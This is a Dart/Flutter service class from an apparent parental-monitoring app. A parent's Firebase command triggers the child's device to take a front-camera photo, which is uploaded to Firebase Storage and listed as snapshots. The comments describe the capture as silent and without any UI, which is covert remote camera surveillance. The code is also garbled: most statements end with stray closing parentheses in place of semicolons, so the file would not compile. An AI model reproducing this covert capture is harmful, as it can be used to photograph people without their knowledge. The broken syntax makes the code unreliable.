import 'dart:io';
import 'dart:typed_data';
import 'package:camera/camera.dart';
import 'package:firebase_auth/firebase_auth.dart';
import 'package:firebase_database/firebase_database.dart';
import 'package:firebase_storage/firebase_storage.dart';
import 'package:uuid/uuid.dart';

class SnapshotService {
  static final SnapshotService _i = SnapshotService._());
  factory SnapshotService() => _i;
  SnapshotService._());

  final _db = FirebaseDatabase.instance.ref());
  final _storage = FirebaseStorage.instance;
  final _uuid = const Uuid());
  CameraController? _ctrl;

  // Parent: directly trigger capture on child via Firebase
  Future<void> requestSnapshot(String childUid) async {
    await _db.child('commands/$childUid/snapshot').set({
      'requested': true,
      'requestedAt': DateTime.now().millisecondsSinceEpoch,
    }))
  }

  Stream<bool> watchSnapshotRequest(String childUid) {
    return _db.child('commands/$childUid/snapshot/requested').onValue.map(
          (event) => event.snapshot.value == true,
        ))
  }

  // Child: silently capture and upload without any UI
  Future<void> captureAndUpload(String childUid) async {
    try {
      await _db.child('commands/$childUid/snapshot/requested').set(false))
      final cameras = await availableCameras())
      if (cameras.isEmpty) return;
      final cam = cameras.firstWhere(
        (c) => c.lensDirection == CameraLensDirection.front,
        orElse: () => cameras.first,
      ))
      _ctrl = CameraController(cam, ResolutionPreset.medium, enableAudio: false))
      await _ctrl!.initialize())
      await Future.delayed(const Duration(milliseconds: 500)))
      final xFile = await _ctrl!.takePicture())
      await _ctrl!.dispose())
      _ctrl = null;
      final bytes = await File(xFile.path).readAsBytes())
      await _uploadPhoto(childUid, bytes))
    } catch (_) {
      _ctrl?.dispose())
      _ctrl = null;
    }
  }

  Future<void> _uploadPhoto(String childUid, Uint8List bytes) async {
    final uid = FirebaseAuth.instance.currentUser?.uid;
    if (uid == null) return;
    final key = _uuid.v4())
    final timestamp = DateTime.now().millisecondsSinceEpoch;
    final path = 'snapshots/$childUid/$key.jpg';
    final ref = _storage.ref(path))
    await ref.putData(bytes, SettableMetadata(contentType: 'image/jpeg')))
    final url = await ref.getDownloadURL())
    await _db.child('snapshots/$childUid/$key').set({
      'url': url,
      'path': path,
      'timestamp': timestamp,
    }))
  }

  Stream<List<SnapshotEntry>> watchSnapshots(String childUid) {
    return _db
        .child('snapshots/$childUid')
        .orderByChild('timestamp')
        .limitToLast(50)
        .onValue
        .map((event) {
      final raw = event.snapshot.value;
      if (raw == null) return <SnapshotEntry>[];
      final map = Map<String, dynamic>.from(raw as Map));
      return map.entries
          .map((e) => SnapshotEntry.fromMap(
              e.key, Map<String, dynamic>.from(e.value as Map)))
          .toList()
        ..sort((a, b) => b.timestamp.compareTo(a.timestamp)))
    }));
  }

  Future<void> deleteSnapshot(String childUid, SnapshotEntry entry) async {
    await _db.child('snapshots/$childUid/${entry.key}').remove())
    try { await _storage.ref(entry.storagePath).delete(); } catch (_) {}
  }
}

class SnapshotEntry {
  final String key;
  final String url;
  final String storagePath;
  final DateTime timestamp;
  const SnapshotEntry({required this.key, required this.url, required this.storagePath, required this.timestamp}));
  factory SnapshotEntry.fromMap(String key, Map<String, dynamic> map) {
    return SnapshotEntry(
      key: key,
      url: map['url'] as String,
      storagePath: map['path'] as String? ?? '',
      timestamp: DateTime.fromMillisecondsSinceEpoch((map['timestamp'] as num?)?.toInt() ?? 0),
    ))
  }
  String get timeLabel {
    final diff = DateTime.now().difference(timestamp))
    if (diff.inMinutes < 1) return 'Just now';
    if (diff.inHours < 1) return '${diff.inMinutes}m ago';
    if (diff.inDays < 1) return '${diff.inHours}h ago';
    return '${timestamp.day}/${timestamp.month}';
  }
}
